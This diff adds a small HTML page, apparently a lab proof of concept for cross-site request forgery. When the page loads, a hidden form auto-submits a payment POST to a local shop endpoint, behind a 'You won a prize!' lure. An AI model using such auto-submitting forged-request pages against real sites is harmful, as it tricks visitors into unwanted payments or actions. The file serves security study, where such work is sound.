@@ -1,0 +1,8 @@
+<!doctype html>
+<!-- LAB ONLY: auto-submits a payment request to YOUR local shop. -->
+<body onload="document.forms[0].submit()">
+  <p>You won a prize!</p>
+  <form action="http://localhost:3000/orders/1/pay" method="POST" style="display:none">
+    <input type="hidden" name="x" value="1">
+  </form>
+</body>
